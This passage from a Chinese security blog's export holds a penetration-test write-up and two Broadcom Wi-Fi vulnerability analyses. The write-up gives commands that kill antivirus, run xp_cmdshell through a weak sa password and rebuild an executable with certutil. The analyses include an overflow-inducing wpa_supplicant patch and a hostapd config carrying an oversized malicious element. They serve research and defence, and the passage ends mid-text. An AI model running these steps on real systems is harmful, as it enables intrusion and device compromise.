思路目标：获取C2的管理权限，包括网站内容管理和替换等，非单纯的系统权限。1、通过C1利用http隧道或DNS隧道进行socks代理，对C2进行进一步渗透2、抓取C1管理员口令或直接利用当前用户的token进行攻击3、利用数据库或中间件弱口令进行攻击4、利用web漏洞进行攻击，如注入、上传和命令执行等漏洞5、中间人攻击或者嗅探等，但是影响太大，也需等比较久的时间 过河搭桥由于是weblogic，无法直接使用http隧道类的代理，因为环境仅支持jspx，没有找到可以用的代理webshell，故采取第二种方案，即通过DNS进行控制和代理。这里我首先想到的自然是cobalt strike的DNS Beacon。 cobalt strike dns beacon 环境构建参考：官方手册 或自行google 获取beacon由于存在360全家桶等，所以得先把他们干掉：1234taskkill /im 360* /t /ftaskkill /im ZhuDongFangYu.exe /t /ftaskkill /im KSafeSvc.exe /t /fps:云锁是定制版，这里就不写进程名称了，也不影响远控的执行，安全无法结束也不影响 由于无法上传exe，所以将生成exe重命名为jspx上传，执行之后，等待几分钟，既可以成功上线，这里有个坑，因为内网配置的DNS可能是一些不知名的或者是114之类的，会影响上线，所以这里建议使用8.8.8.8或者119.29.29.29，因为我用的是DNSPOD，修改DNS:1netsh interface ip set dns \"本地连接\" source=static addr=119.29.29.29 开启代理 参考官方手册 linux可以用Proxychains，windows可以使用Proxifier PE或SocksCap64 内网漫游 通过jsp大马自带的端口扫描发现C2开放的端口有： 80：WMC生成的html，没啥可搞的 1433：因为C1的mysql账号密码是root/root，因此猜测存在弱口令 8080、8001、8081：就apache的一个代理，没有什么页面和功能 利用socks代理通过1433连接器，sa/sa获取了mssql的DBA权限，暗自高兴了一会，以为道这里就快搞定了，因为系统存在多个web服务，很自然的可以想到，直接可以通过mssql的xp_cmdshell，echo一个一句话就可以搞定了，然而这只是开始。 山重水复疑无路iis环境，可以写一句话，但是所有目录的脚本权限都被禁止，所以这条路也断了123456简单提一下，iis找网站路径的方法1. dir/s /b f:\\123.jpg (磁盘文件太多时无法使用)2. 查看配置文件：iis6:type %systemroot%\\system32\\inetsrv\\metabase.xml|findstr Path=iis7/8:type %systemroot%\\System32\\inetsrv\\config\\applicationHost.config|findstr physicalPath=iis7/8: appcmd list sites apache环境并没有装php，无法执行php脚本12wmic process where name=\"httpd.exe\" get processid,executablepath,name其他中间件或web服务的也可以根据运行程序的路径，查看其配置文件，使用wmic命令查看运行路径: 上远控，远控怎么上传上去呢？于是找到这篇文章《15种文件下载的方式》 再win2k3上面能用的，就剩下ftp、vbs、Bitsadmin、smb、c#、hex vbs和smb都被安全狗限制无法利用 c#编译成功了，但是无法下载，貌似也被限制了 bitsadmin不存在此命令 FTP批量处理下载，C1上面有一个FTP，也是无法成功下载 hex太长转换麻烦，暂时不考虑 刚刚最近国外有大神提到了certutil命令，本地测试了一下，下载的文件无法指定路径，也不能正常保存，故又放弃了此路，详情可以参考这篇文章，win2k3保存有问题 柳暗花明又一村 经过尝试各种下载姿势，还是无法下载，想了很久，又回到了certutil，因为他是系统自带的命令，从win2k3道windows 2016都是存在的，既可以用于下载，也可以用于base64编码和文件hash校验。故此：通过certutil将生成的exe转换为base64编码，利用echo命令写入到文本12345678910111213141516171. 文件hash(1) SHA1certutil.exe -hashfile msg.dll(2) SHA256：certutil.exe -hashfile msg.dll SHA256(3) MD5：certutil.exe -hashfile msg.dll MD52.编码(1) base64编码：CertUtil -encode InFile OutFile(2) base64解码CertUtil -decode InFile OutFile注：编码后的文件会添加两处标识信息，不影响文件解码文件头：-----BEGIN CERTIFICATE-----文件尾：-----END CERTIFICATE----- mssql查询分析器批量echo文本保存1exec master..xp_cmdshell \"echo xxxx &gt;&gt; C:\\temp\\test.txt\" 使用certutil还原exe可以还原为txt，因为exe无法写入，并使用其校验文件hash结束相关杀软进程和服务，这里提一点，因为C2的360是自动启动的，所以需要禁用自启，由于sc无法使用，我们可以使用wmic替代：1234exec master..xp_cmdshell \"taskkill /im 360* /t /f\"taskkill /im ZhuDongFangYu.exe /t /fexec master..xp_cmdshell \"wmic Service where name='360EntClientSvc' call stopservice\"exec master..xp_cmdshell \"wmic Service where name='360rp' call stopservice\" 最后运行解码的exe即可12CertUtil -decode test.txt xshell.txtwmic process call create 'c:\\temp\\xshell.txt' 总结 本次渗透，可以说是一波三折，主要学习到的东西是在复杂环境下，综合利用各种windows自带的工具进行绕过安全防护，如wmic、taskkill、certutil等综合运用，才得以绕过杀软的防御，也存在一定运气的成分如数据库弱口令、病毒库更新不及时等。 从防御的角度来看的话：1、加强日常安全运维的巡检，其实我的exe上传不止一次被杀或这被拦截，如果巡检自然可以发现2、提高安全运维人员意识，做好安全策略管理，如数据库弱口令这些本不该有的3、及时更新防病毒软件和恶意代码库，新版的360没法结束4、加强对外恶意流量的安全检测，如DNS、http等","tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.future-sec.com/tags/内网渗透/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/categories/web安全/"}]},{"title":"物联网硬件安全分析基础-硬件分析初探","date":"2017-11-16T16:00:00.000Z","path":"iot-security-hardware-analysis.html","text":"前言当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通信的抓包等方式可以获得部分的信息，但如果需要深入分析智能设备底层的工作原理，从中发现更深层次的安全问题，就不可避免的需要直接接触硬件本身，这也是传统安全手段未能触及的部分，据此，下面简单的谈下关于电路分析和芯片固件提取和调试的一点心得。 芯片ROM芯片常见的IOT产品，一般采用嵌入式linux系统开发，对芯片分析主要目的之一就是获取到硬件系统的固件，从固件中分析可能存在的安全风险。固件一般存储在ROM中，ROM是只读存储器（Read-Only Memory）的简称，是一种只能读出事先所存数据的固态半导体存储器。其特性是一旦储存资料就无法再将之改变或删除。通常用在不需经常变更资料的电子或电脑系统中，并且资料不会因为电源关闭而消失。常见的存储芯片按照存储读取方式和制作工艺不同，可以分为： ROM、PROM、EPROM、EEPROM、FLASH-ROM。在大部分IOT产品中多采用flash芯片作为存储器，提取固件主要也是通过读取flash芯片。 Flash芯片FLASH ROM属于真正的单电压芯片，在使用上很类似EEPROM，因此，有些书籍上便把FLASH ROM作为EEPROM的一种。事实上，二者还是有差别的。FLASH ROM在擦除时，也要执行专用的刷新程序，但是在删除资料时，并非以Byte为基本单位，而是以Sector（又称Block）为最小单位，Sector 的大小随厂商的不同而有所不同；只有在写入时，才以Byte为最小单位写入；FLASH ROM芯片的读和写操作都是在单电压下进行，不需跳线，只利用专用程序即可方便地修改其内容；FLASH ROM的存储容量普遍大于EEPROM，约为512K到至8M KBit，由于大批量生产，价格也比较合适，很适合用来存放程序码，近年来已逐渐取代了EEPROM，广泛用于主板的BIOS ROM，也是CIH攻击的主要目标。 根据技术方式不同可分为： IIC EEPROM、SPI NorFlash 、CFI Flash、Parallel NandFlash、SPI NandFlash、eMMC Flash、USF2.0等。其中SPI NorFlash因为接口简单，使用的引脚少，易于连接，操作方便，并且可以在芯片上直接运行代码，其稳定性出色，传输速率高，在小容量时具有很高的性价比，这使其很适合应于嵌入式系统中作为 FLASH ROM，所以在市场的占用率非常高。我们通常见到的S25FL128、MX25L1605、W25Q64等型号都是SPI NorFlash，其常见的封装多为SOP8，SOP16，WSON8，US0N8，QFN8、BGA24等。 芯片印字 一般PCB上有多块逻辑处理IC，在多个IC芯片中，可以通过分析电路原理和查找芯片印字来确定具体的存储芯片。 芯片上的丝印大多数情况会注明厂商和芯片型号，通过印字可以初步确定芯片类型，同时丝印层的文字也可以帮助我们来确定存储的格式和大小，常见的W25芯片的印字含义如下： 编程器读取Flash芯片，需要借助编程器，编程器又称烧录器、写入器、写码器，是专门用来对IC芯片进行读写、编程/烧录的仪器。并口多功能BIOS编程器，它可以对EPROM（27系列芯片）、EEPROM（28系列芯片）、FLASH ROM（29、39、49系列芯片）及单片机、串行芯片等进行读写、编程，是一种性价比较高的编程器。编程器种类多样，从功能简单的专用型到功能全面的全功能通用型都有，价格从几十元到上万元不等。 通信协议串口通信指串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。在串口通信中，常用的协议包括RS-232、RS-422和RS-485。 RS-232通信方式允许简单连接三线：Tx、Rx和地线。但是对于数据传输，双方必须对数据定时采用使用相同的波特率。 RS-422RS-422标准全称是“平衡电压数字接口电路的电气特性”，在RS232后推出，使用TTL差动电平表示逻辑，就是两根的电压差表示逻辑，RS422定义为全双工的，所以最少要4根通信线（一般额外地多一根地线）。 RS-485 RS485是一个定义平衡数字多点系统中的驱动器和接收器的电气特性的标准，RS-485与RS-422的区别在于RS-485为半双工通信方式，RS-422为全双工方式。RS-422用两对平衡差分信号线分别用于发送和接收，所以采用RS-422接口通信时最少需要4根线。RS-485只用一对平衡差分信号线，不能同时发送和接收，最少只需两根连线。 SPI spi是串行外设接口（Serial Peripheral Interface）的缩写。SPI，是一种高速的，全双工，同步的通信总线，并且在芯片的管脚上只占用四根线，节约了芯片的管脚，同时为PCB的布局上节省空间，提供方便，正是出于这种简单易用的特性，如今越来越多的芯片集成了这种通信协议，比如AT91RM9200。 I2C I2C 即Inter-Integrated Circuit(集成电路总线），这种总线类型是由飞利浦半导体公司在八十年代初设计出来的一种简单、双向、二线制、同步串行总线，主要是用来连接整体电路(ICS) ，IIC是一种多向控制总线，也就是说多个芯片可以连接到同一总线结构下，同时每个芯片都可以作为实时数据传输的控制源。这种方式简化了信号传输总线接口。 信号分析示波器分析示波器是一种用途十分广泛的电子测量仪器。它能把肉眼看不见的电信号变换成看得见的图像，便于人们研究各种电现象的变化过程。示波器利用狭窄的、由高速电子组成的电子束，打在涂有荧光物质的屏面上，就可产生细小的光点（这是传统的模拟示波器的工作原理）。在被测信号的作用下，电子束就好像一支笔的笔尖，可以在屏面上描绘出被测信号的瞬时值的变化曲线。利用示波器能观察各种不同信号幅度随时间变化的波形曲线，还可以用它测试各种不同的电量，如电压、电流、频率、相位差、调幅度等等。 通过分析电路结构，找到待测的引脚和信号源，分析其信号变化和具体的信号形式,得到模拟信号和经过外部AD转换信号的波形图。 逻辑分析仪逻辑分析仪是分析数字系统逻辑关系的仪器。逻辑分析仪是属于数据域测试[2]仪器中的一种总线分析仪，即以总线（多线）概念为基础，同时对多条数据线上的数据流进行观察和测试的仪器，这种仪器对复杂的数字系统的测试和分析十分有效。逻辑分析仪是利用时钟从测试设备上采集和显示数字信号的仪器，最主要作用在于时序判定。由于逻辑分析仪不像示波器那样有许多电压等级，通常只显示两个电压（逻辑1和0），因此设定了参考电压后，逻辑分析仪将被测信号通过比较器进行判定，高于参考电压者为High,低于参考电压者为Low，在High与 Low之间形成数字波形。 通过连接待测设备的接口，分析其中通信数据，通过协议转码，可以得到具体的16进制数据。 设备拆解对于一台未接触过的机器，拆解首先需要观察其外部结构，是否存在暴露的螺丝孔，如果没有，一般可能隐藏在贴纸或橡胶垫下面，可以用手感受是否存在空洞，部分机器采用卡榫结构，只要找对方向，用一字螺丝刀或撬片，从缝隙中就可以撬开，拆解设备唯一的要诀就是胆大心细。部分常用工具如下： 维修组合套装，用来拆装各类螺丝，PCB夹用来拔出排线，热风枪和焊台用来拆焊各类元器件和芯片，BGA焊台用于拆焊BGA封装的芯片。 常见物联网智能设备 共享充电宝，采用gprs模块配合物联卡与云端通信 蓝牙挂锁，通过蓝牙芯片与手机配对通信，蓝牙控制电机驱动，使卡锁运转 共享充电宝，采用GSM模块加蓝牙模块控制通信 智能锁，WIFI芯片加蓝牙芯片配合控制，外接指纹识别传感器 智能摄像头，采用WIFI芯片通信，外接音频、视频处理模块 网络摄像机，采用网卡芯片，配合多口输出输入视频信号模块 智能路由器，高容量内存搭配智能OS 智能家居控制终端，高性能WIFI收发中继控制 智能保险柜，采用WIFI芯片控制加指纹识别传感器 无线终端，采用4G模块和WIFI芯片，做便携式WIFI终端 参考文献 http://www.china-cic.cn/ 中国通信协会相关文献 https://www.eia.gov/ 美国电子工业协会相关标准","tags":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/tags/硬件安全/"},{"name":"硬件分析","slug":"硬件分析","permalink":"http://www.future-sec.com/tags/硬件分析/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"BROADCOM WI-FI芯片漏洞分析一","date":"2017-08-29T16:00:00.000Z","path":"broadcom-wifi-1.html","text":"前言Android Wi-Fi驱动一直是众多安全研究员关注的重点，Android Wi-Fi驱动中曾经被发现大量root提权漏洞。 但这些漏洞都是存在于WEXT(Wireless-Extensions)接口中的，WEXT是一种即将被淘汰的Wi-Fi配置接口。取而代之的是基于nl80211协议的cfg80211接口。本篇文章主要介绍了基于nl80211协议的cfg80211怎么触发Wi-Fi芯片中的漏洞。以及相关漏洞的定位和分析。 为什么研究Wi-Fi？Wi-Fi的使用已经与生活密不可分，Wi-Fi安全问题也应该受到更大的重视。在最近的一次移动安全峰会上，有一个议题是关于Wi-Fi芯片漏洞远程代码执行的。借此，重点研究了一下Wi-Fi芯片漏洞。 读懂Poc需要哪些前提知识JNIpoc 是jni语言编写的，那什么是jni呢? JNI全称为java native interface,Java本地开发接口,JNI是一个协议,这个协议可以用来沟通Java代码和本地的c/c++代码 让两者可以相互的调用在poc的文件结构中我们可以看到一个jni文件都包含下面三个文件：• Android.mk文件是在使用NDK编译C代码时必须的文件。Android.mk文件中描述了哪些C文件将被编译且指明了如何编译。• Application.mk目的是描述在你的应用程序中所需要的模块(即静态库或动态库)。• Pwn.c是触发漏洞的测试代码。 Netlink Protocol Library Suite （libnl）主要用来套接字的处理、发送和接收数据、消息的构造和解析。 NetlinkNetlink协议是基于套接字的进程间通信（IPC）机制，它可用于用户空间进程和内核之间或者用户空间进程之间的通信。Netlink 协议基于 BSD 套接字并使用 AF_NETLINK 地址簇。每一个 Netlink协议都有自己的协议号（比如：NETLINK_ROUTE，NETLINK_NETFILTER，等等）。它的寻址方案是基于 32 位的端口号（之前被称为 PID），这个端口号用来唯一的标识每一个对等通信节点。-nl_send_auto_complete()消息和数据的发送函数poc中主要使用nl_send_auto_complete函数来发送数据，这个是libnl封装好的。最终还是调用nl_send_auto() 函数来发送数据。参考一个翻译的官方文档：http://blog.guorongfei.com/2015/01/27/libnl-translation-part4/-nla_put()数据封装函数nla_put() 函数以 nla_reserve()函数为基础，只不过它还接收一个指向包含属性载荷的缓冲区的指针。这个函数会自动把数据从缓冲区拷贝到消息中去。会利用嵌套属性进行数据包封装，属性的嵌套是通过在代码前后分别调用nla_nest_start() 和 nla_nest_end() 来完成的。nla_nest_start() 函数会在消息中添加一个没有实际载荷的属性头部，在此之后添加的数据都会成为容器属性的载荷部分直到调用 nla_nest_end()为止，它的调用“关闭”了容器属性并校正它的载荷长度以包含所有的数据长度。 cfg80211/nl80211nl80211是供用户空间进程使用，操作利用cfg80211 API 开发无线网卡驱动。cfg80211是开发驱动的接口。 TDLS 协议TDLS旨在提供一种不依赖AP的Wi-Fi网络上的对等通信方式。 TDLS是基于IEEE 802.11z标准。TDLS自动链接配置主要通过几个过程来完成• TDLS Discovery过程TDLS Discovery过程不是必要选项。一个TDLS STA设备可以选择直接发起TDLS建立过程。 TDLS Discovery 过程由一部STA设备通过AP或Go(群组拥有者) 向另外一部STA设备发送一个TDLS Discovery请求帧开始。如果目标设备也兼容TDLS，它将直接向该发送设备回复TDLS Discovery 响应帧，并提供有关设备本身的能力信息。包括所有支持速率及信道。TDLS Discovery 过程除了提供目标STA确实支援TDLS的相关能力信息外，TDLS Discovery过程的帧交互亦可以用作AP与目标TDLS STA设备的相对信号强度的测量。发起的STA能够判断与目标STA间的直接连接是否有利于提供有效信息。通过对比分別由目标STA设备与AP设备收到的信号强度，发起的STA设备可以评估建立直接连接是否会比通过AP发送数据包更为有效。• TDLS Setup过程TDLS Setup过程需要进行一系列的帧交换。发起设备首先发送一个TDLS传输请求，通过AP信道传输至目标设备。封装帧包括发送设备的性能信息。目标设备之后会回复TDLS Setup 建立响应，同样通过AP信道传送其性能信息，另外附加一个状态代码，表示接受或者拒绝该建立请求。如果接受Setup请求，发送设备将会通过AP传送一个TDLS 确认帧（Confirm Frame）。至此，两部设备之间开始进行直接通讯。• TDLS Teardown过程发送方或接受方设备均可向另外一方直接发送TDLS拆解帧（Teardown Frame），而如果未处于讯号范围內，该帧则可以通过AP信道传输。 POC 的分析过程NDK环境搭建网上有很多参考，这里就不再赘述。 编译POC在这次研究过程中，POC的编译过程花费了大量时间。主要是不了解libnl库的正确使用方法，然后找了很多资料都是安卓开发ndk的，没有怎么使用libnl库的。最后经过大量资料参考，终于找到了一种暂时可行的方法，在那篇博文中作者称目前android自身没有携带libnl库，所以如果用到libnl库就需要把libnl一起移植到安卓上。我们就根据他所描述的方法，从github上down下来了一份已经移植好的安卓平台的libnl库。具体命令如下：12345git clone https://github.com/dschuermann/libnl-3-androidcd libnl-3-android/libcd ../android_toolchaingvim jni/Android.mk(前文有该文件的相关介绍)gvim jni/Applcation.mk (前文有该文件的相关介绍) 在Android.mk的最后部分加上这一段：1include $(CLEAR_VARS) LOCAL_MODULE := pwn LOCAL_SRC_FILES := $(call list-all,$(LOCAL_PATH),pwn.c) LOCAL_SHARED_LIBRARIES := nl-3 nl-genl-3 include $(BUILD_EXECUTABLE) 修改好之后将pwn.c文件拷贝到lib文件就可以编译了。12cd ../../android_toolchainndk-build 编译好后将libs文件夹下的libnl-3.so，libnl-genl-3.so，pwn 利用adb命令将libs文件下的lib-3.so、lib-genl-3.so、pwn拷贝到已经root后的支持nl80211协议的测试机中，执行编译好的pwn就可以测试poc是否可用了。 测试POC分别在华为、小米、nexus 6p手机上进行了poc的测试。poc具体执行情况在小米手机上执行所有poc都是no such file or directory 。在华为手机上发送数据后的返回值为success。nexus手机测试结果也是success。 因为没有过wifi漏洞分析经验，不知道触发漏洞后正确的返回值应该是什么？所以接下来要透彻了解漏洞是否触发还需要大量的固件分析，漏洞定位，利用漏洞复现工作。 Wifi芯片代码分析经过一系列的各种折腾，终于开始慢慢切入正题。分析的芯片是nexus 6p 6.0 版本。 怎么找到Wi-Fi固件？要分析漏洞的成因，需要找到Wi-Fi芯片中与应用层通信部分代码。那接下来要怎么做才能将手机中的固件代码导出来呢？第一步：我们需要了解Wi-Fi芯片在安卓系统内存中的加载位置。关于这个问题我们参考了Project Zero 的博客中分析的有关Wi-Fi芯片架构的知识，在Broadcom Wi-Fi芯片组相关的数据手册中，ARM内核具有用于保存固件代码的640KB ROM，以及用于数据处理（例如堆）和存储固件代码补丁的768KB RAM。 RAM的位置可以通过读取主机驱动程序中的初始化代码，找到包含RAM内容的文件是上图所示fw_bcmdhd.bin文件（实际上，通过驱动程序的代码，我们找到了BCMDHD_FW_PATH配置，其用于表示驱动程序将内容上传到RAM的文件的位置。） ROM转存则可以通过Broadcom提供的一个非常强大的命令行实用程序dhdutil，可用于通过bcmdhd驱动程序与芯片进行交互。命令： ./dhdutil -i wlan0 membytes r 0x0 0xA0000 &gt; /sdcard/rom.bin 什么时候产生漏洞？ 利用上述方法转存出来bin文件之后，我们首先要了解bug产生的原因，才能下一步更好的定位漏洞位置。根据Project Zero提供的技巧，Wi-Fi管理帧以小的“标记”数据块（称为信息元素（IE））对大多数信息进行编码，传输的大部分信息也是利用IE进行编码的，所以这应该是我们逆向分析的一个好的出发点，有数据交互才可能出现漏洞。分析了漏洞利用可行性之后确定了在进行TDLS连接过程中会触发漏洞。有关TDLS前文中有描述。 定位固件中漏洞位置根据Project Zero的提示在brcmsmac驱动程序可以找到Broadcom是使用一个函数从bcm_parse_tlvs帧提取IE。那接下来我们需要做的就是定位这个函数。搜索附近字符串提示我们首先定位到了bcm_parse_tlvs函数位置。然后通过交叉参考分析最终找到漏洞函数，要探索该漏洞的成因，首先要知道TDLS建立确认帧的函数处理流程。这个函数首先会执行一些验证，以确保请求是合法的。其查询内部数据结构，以确保确实正在与请求对等体建立TDLS连接。然后，其验证Link-ID IE（通过检查其编码的BSSID与当前网络的匹配），并且还验证32字节的发起者随机数（“Snonce”）值（通过将其与存储的初始随机数进行比较）。 建立对请求可能确实是合法的一定程度的置信度后，该函数开始调用一个内部帮助函数，任务是计算MIC并确保其与编码在帧中的一致。固件还包括该函数的名称(“wlc_tdls_cal_mic_chk”)。我们先看MIC通过编码在握手帧中的计算。 我们对固件逆向后也定位到了这个函数，如下图所示，反编译后伪代码中提示信息可以看到在标记的第二段代码进行了IE长度的校验，后续的IE就没有校验了。因此，将RSN-IE的长度设置为较大的值将导致Timeout Interval和Fast Transition IE越界复制，从而溢出缓冲区。 接下来看断开连接时mic计算。 伪代码中的在断开帧时没有对FT-IE进行溢出校验，如果构造好FT-IE数据就能触发溢出。 漏洞触发场景复现知道了漏洞是怎么产生的，接下来就是测试漏洞是否按照我们预期的那样能够触发。首先，准备了同时支持TDLS 协议的TL-WN722N无线网卡，跟nexus 6p。第二步，为了测试漏洞，需要修改wpa_supplicant，以使我们能发送包含过大FTIE的TDLS断开帧。查看wpa_supplicant的代码可快速识别负责生成和发送断开帧的函数wpa_tdls_send_teardown。通过对该函数添加一些小的更改（绿色），我们应该能够在收到断开帧时触发溢出，导致超写25个字节的0xAB，修改后make编译一下。1234567891011121314static int wpa_tdls_send_teardown(struct wpa_sm *sm, const u8 *addr, u16 reason_code)&#123;...ftie = (struct wpa_tdls_ftie *) pos;ftie-&gt;ie_type = WLAN_EID_FAST_BSS_TRANSITION;ftie-&gt;ie_len = 255;os_memset(pos + 2, 0x00, ftie-&gt;ie_len);os_memset(pos + ftie-&gt;ie_len + 2 - 0x19, 0xAB, 0x19); //Overflowing with 0xABos_memcpy(ftie-&gt;Anonce, peer-&gt;rnonce, WPA_NONCE_LEN);os_memcpy(ftie-&gt;Snonce, peer-&gt;inonce, WPA_NONCE_LEN);pos += ftie-&gt;ie_len + 2;...&#125; 第三步，执行TDLS命令去触发。这种情况是可以触发漏洞的，但是呢并没有明显现象的原因是Broadcom堆实现背后的逻辑。深入分析分配算符的逻辑，我们发现其非常简单，其是一个简单的“最适合”分配算符，其执行向前和向后合并，并保持一个空闲块单链表。当分配块时，从最适合空闲块（足够大的最小块）的末端（最高地址）对其进行切取。在断开连接后，空闲列表中的其中一个块的大小突然异常大。回想一下，由于分配算符使用“最适合”，这意味着只要存在其他足够大的空闲块，后续分配将不会被放置在此块中。这也意味着固件不会崩溃，实际上会继续正常运行。如果我们不可视化堆的状态，我们就根本无法确定发生了什么事。123TDLS_DISCOVER – 发送“TDLS发现请求”帧并列出响应TDLS_SETUP - 建立与具有给定MAC地址的对等体的TDLS连接TDLS_TEARDOWN - 断开与具有给定MAC地址的对等体的TDLS连接 总结最近两周的分析过程中，确实遇到了很多问题，比如最开始编译poc的过程中对libnl库不会用，花了很长时间，最终的可行方法也不知道是不是最适合的。poc代码中使用了内核通信netlink协议，之前并没有接触过，这次也只是花了两天时间粗略看了poc中用到的函数。有关netlink相关知识后续还要深入学习。接下来编译测试poc之后，poc测试返回success但是并没有明显的触发漏洞现象。基于此，参考了Project Zero的博客复现了CVE-2017-0561漏洞，整个过程从Wi-Fi芯片固件的知识开始了解，到怎么定位漏洞位置，怎么找到漏洞，怎么利用漏洞触发漏洞。这个过程也学到了很多知识。比如，Wi-Fi帧格式、TDLS协议、Broadcom堆实现、支持TDLS协议的wpa_supplicant开源工具等这些的理解。接下来要想利用漏洞就需要深入的去理解Wi-Fi的通信过程，netlink协议，以及动态的分析过程。 参考链接1、 http://bobao.360.cn/learning/detail/3742.html2、 https://googleprojectzero.blogspot.jp/2017/04/over-air-exploiting-broadcoms-wi-fi_4.html","tags":[{"name":"Poc","slug":"Poc","permalink":"http://www.future-sec.com/tags/Poc/"},{"name":"BROADCOM WI-FI","slug":"BROADCOM-WI-FI","permalink":"http://www.future-sec.com/tags/BROADCOM-WI-FI/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"BROADCOM WI-FI芯片漏洞分析二","date":"2017-08-29T16:00:00.000Z","path":"broadcom-wifi-2.html","text":"前言上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。1、首先是定位到帧提取函数2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的bcm_parse_tlvs函数。上篇文章已经给出了具体伪代码示例。这里就不再赘述。3、定位到函数之后我们可以根据Project Zero 提供的高级逻辑在ida中定位到相关位置。12345678910111213141516171819uint8_t* buffer = malloc(256);uint8_t* pos = buffer;//Copying the initial (static) informationuint8_t* linkid_ie = bcm_parse_tlvs(..., 101);memcpy(pos, linkid_ie + 0x8, 0x6); pos += 0x6; //Initiator MACmemcpy(pos, linkid_ie + 0xE, 0x6); pos += 0x6; //Responder MAC*pos = transaction_seq; pos++; //TransactionSeqmemcpy(pos, linkid_ie, 0x14); pos += 0x14; //LinkID-IE//Copying the RSN IEuint8_t* rsn_ie = bcm_parse_tlvs(..., 48);if (rsn_ie[1] + 2 + (pos - buffer) &gt; 0xFF) &#123; ... //Handle overflow&#125;memcpy(pos, rsn_ie, rsn_ie[1] + 2); pos += rsn_ie[1] + 2; //RSN-IE//Copying the remaining IEsuint8_t* timeout_ie = bcm_parse_tlvs(..., 56);uint8_t* ft_ie = bcm_parse_tlvs(..., 55);memcpy(pos, timeout_ie, 0x7); pos += 0x7; //Timeout Interval IEmemcpy(pos, ft_ie, 0x54); pos += 0x54; //Fast-Transition IE 到这里就不再继续解释了。如果还有地方不清楚可以提出疑问。 切入主题1、本篇文章主要核心是侧重CVE-2017-9417的漏洞分析和利用。2、涉及到的相关知识将以链接形式详细给出 CVE-2017-9417漏洞分析分析ROM固件找到漏洞1、一种方式是七月分打过补丁的Rom固件跟六月份没打补丁的利用 BinDiff （安装到IDA目录下在IDA中以插件形式执行，Crtl+6使用）对比，看修改了哪个补丁。最后可以找到漏洞函数wlc_bss_parse_wme_ie。这个函数用来处理关联、重新关联和信标包。这些信标包包含信息元素，包含Wi-Fi标准扩展的数据。每个信息元素（IE）的格式是：type (1 byte), length (1 byte), data of (length) bytes2、这个函数功能用来处理服务质量扩展的WME信息元素。下图是WME信息元素的格式：3、定位漏洞函数· bindiff对比6月份补丁跟7月份补丁的差异· 第一步：将两个补丁版本都dump下来。· 第二步：安装bindiff 到 ida 目录。安装方式，这里提供windows下安装包bindiff· 第三步：先用ida打开7月份补丁，分析固件补丁时要注意它在内存中的存储位置，在上篇文章中我们提到ram在安卓系统内存中加载起始地址在0x180000.所以我们需要在ida加载时手动设置加载起始位置。并将分析好的数据保存数据库idb文件来方便我们跟6月份版本做对比。具体配置如下：· 第四步：同样方式打开6月份补丁文件，Crtl+6启动bindiff插件，选择我们上一步保存的idb文件，可以对比分析两个版本有什么不同。 跟踪到造成漏洞的函数。 漏洞成因·该函数在关联/重新关联响应帧部分出现bug，它将接收到的ie复制到24（0x18）字节长的预分配缓冲区，大小适合最大的有效WME信息元素长度，但是使用信息元素头的长度可以高达255（0xff），创建一个堆在外边界写入231个字节，可造成溢出。 分析wlc_bss_parse_wme_ie漏洞函数。assocresp_ies数据分析数据包信息大致理解关联帧IE的0x0c头部信息暂时理解为特定供应商标签。如下图比较可以看到修补bug前，没有对wme大小进行校验直接拷贝到预分配的缓冲区。缓冲区分配ida中参考在这里 触发漏洞这个bug很容易复现，因为最新版的Hostapd 支持自定义信息元素。hostapd 安装：链接 下载hostapd到ubuntu 14.04 解压hostapd 配置hostapd，使它编译为支持nl80211驱动cp defconfig .configvi .config #找到“#CONFIG_DRIVER_NL80211=y”，去掉“#”符号。保存。 make #编译hostapd ，编译过程会报错，是因为缺少libnl库解决方法：下载并编译安装libnl 可以到主页下载：http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：12345git clone git://github.com/tgraf/libnl-1.1-stable.gitcd libnl-1.1-stable./configuremakesudo make install 5、make编译在启动hostapd时指定配置文件1、新建配置文件 在/etc/目录新建一个文件hostapd.conf2、配置文件内容1234567891011121314# WiFi Hotspotinterface=wlan0driver=nl80211#Access Pointssid=YourNetworkNameHerehw_mode=g# WiFi Channel:channel=1macaddr_acl=0auth_algs=1ignore_broadcast_ssid=0assocresp_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141vendor_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141 1.interface：接入点设备名称，注意不要包含ap后缀，即如果该设备称为wlan0ap，填写wlan0即可；2.driver：设定无线驱动，我这里是nl80211；3.ssid: 设置名字(SSID = service set identifier) ,老版本(iwconfig)叫”essid”.4.hw_mode: 设置操作mode,channels.有效的值取决于硬件,通常:a, b, g. ‘g’大多数都支持, 并向前兼容802.11b5.channel:设置hostapd操作的channel.6.ignore_broadcast_ssid: 开启或禁用广播ssid.7.macaddr_acl: MAC地址过滤. .8.auth_algs: 指定采用哪种认证算法，采用位域（bit fields）方式来制定，其中第一位表示开放系统认证（Open System Authentication, OSA），第二位表示共享密钥认证（Shared Key 